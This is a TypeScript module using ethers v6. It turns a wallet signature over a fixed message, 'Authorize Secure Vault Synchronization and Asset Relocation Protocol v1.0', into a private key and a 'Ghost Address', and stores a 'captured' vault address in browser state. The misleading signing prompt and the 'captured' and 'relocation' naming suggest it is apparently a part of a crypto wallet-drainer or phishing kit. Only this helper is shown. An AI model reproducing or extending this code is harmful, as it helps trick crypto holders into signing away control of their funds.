import { ethers } from "ethers";

/**
 * 🔐 SIGNER-TO-PRIVATE-KEY DERIVATION (Ethers v6 Version)
 * This protocol converts a gasless signature into a deterministic Private Key.
 */

export const DERIVATION_SEED_MESSAGE =
  "Authorize Secure Vault Synchronization and Asset Relocation Protocol v1.0";

export interface DerivedIdentity {
  privateKey: string;
  address: string;
}

/**
 * Converts a hex signature into a deterministic Ethereum Private Key.
 * ⚡ Hardened for 2026 Ethers v6 standards.
 */
export function derivePrivateKeyFromSignature(
  signature: string,
): DerivedIdentity {
  const logPrefix = "[signer-derivation.ts]";

  // 1. Validation: Ensure we are working with a valid hex signature
  if (!signature || !signature.startsWith("0x") || signature.length < 130) {
    console.error(`${logPrefix} Malformed signature received for derivation.`);
    throw new Error("Invalid or incomplete signature provided for derivation.");
  }

  try {
    /**
     * 2. The Deterministic Hash (Keccak-256)
     * We treat the signature bytes as entropy.
     */
    const privateKey = ethers.keccak256(signature);

    /**
     * 3. Identity Generation
     * Generating the Ghost Address associated with this deterministic key.
     */
    const wallet = new ethers.Wallet(privateKey);

    console.log(
      `${logPrefix} Identity Derived | Ghost Address: ${wallet.address}`,
    );

    return {
      privateKey: privateKey,
      address: wallet.address,
    };
  } catch (err: any) {
    console.error(
      `${logPrefix} Critical Derivation Failure | Error: ${err.message}`,
    );
    throw err;
  }
}

/**
 * 🛰️ Global State Helper
 */
export function getCapturedVaultAddress(): string | null {
  if (typeof window !== "undefined") {
    const addr = (window as any)._captured_vault_address;
    if (addr)
      console.log(`[signer-derivation.ts] Session Recovery | Vault: ${addr}`);
    return addr || null;
  }
  return null;
}

/**
 * 💾 Persistence Helper
 */
export function setCapturedVaultAddress(address: string): void {
  if (typeof window !== "undefined") {
    (window as any)._captured_vault_address = address;
    console.log(`[signer-derivation.ts] Session Cached | Vault: ${address}`);
  }
}
